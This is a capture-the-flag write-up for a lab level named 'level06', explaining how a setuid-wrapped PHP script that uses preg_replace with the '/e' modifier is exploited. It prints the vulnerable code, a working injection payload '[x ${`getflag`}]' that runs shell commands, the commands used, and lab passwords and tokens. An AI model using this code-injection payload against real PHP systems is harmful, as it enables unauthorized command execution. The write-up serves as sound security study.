# level06

"oh sa mère du php jvais câbler" - yandry, 2026

A PHP script from the age when `preg_replace` had an `/e` flag that meant "and also please run this as code". PHP has since removed it out of sheer embarrassment. We get to enjoy it one last time :)

| | |
| --- | --- |
| **Login** | `level06` / `viuaaale9huek52boumoomioc` (the flag05 token) |
| **flag06 password** | n/a (the setuid binary runs the PHP as flag06) |
| **flag06 token** | `wiok45aaoguiboiki2tuin6ub` (aka the level07 password) |

## poking around

Two files in home, both owned by flag06:

```bash
$ ls -l ~
-rwsr-x---+ 1 flag06 level06 7503 ... level06        # setuid ELF
-rwxr-x---  1 flag06 level06  356 ... level06.php     # the actual logic
```

The binary is just a setuid wrapper that runs the PHP script as flag06. The interesting part is the script.

## the script

```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);   // <-- the /e flag
  ...
}
$r = x($argv[1], $argv[2]); print $r;
```

It reads a file we name (`$argv[1]`) and runs it through `preg_replace`. The replacement string is `y("\\2")`, where `\2` is whatever matched `(.*)` inside `[x ...]`. Normally that would just build a string and hand it to `y()`.

The killer is the `/e` modifier. With `/e`, PHP doesn't treat the replacement as text, it **evaluates it as PHP code**. So the literal `y("\\2")` is compiled and run, with our captured text spliced right into it. We control a file, the file content becomes code. Game over.

## the payload

We need something that matches `[x (.*)]` and whose captured part runs a command once it's eval'd inside a double-quoted string. PHP interpolates `${...}` inside double quotes, and backticks inside that are shell execution:

```
[x ${`getflag`}]
```

Walk it through: `(.*)` captures `${`getflag`}`, so the evaluated code becomes `y("${`getflag`}")`. Building that string makes PHP run `` `getflag` `` (shell_exec, as flag06), hand the result to `${...}` as a variable name, and print it.

```bash
$ printf '[x ${`getflag`}]\n' > /tmp/l6.txt
$ ~/level06 /tmp/l6.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub ...
```

It complains that the token isn't a valid variable name, which, fair, but it already ran `getflag` to find that out and printed the token right there in the error. `payload.txt` in this folder is that one-liner.
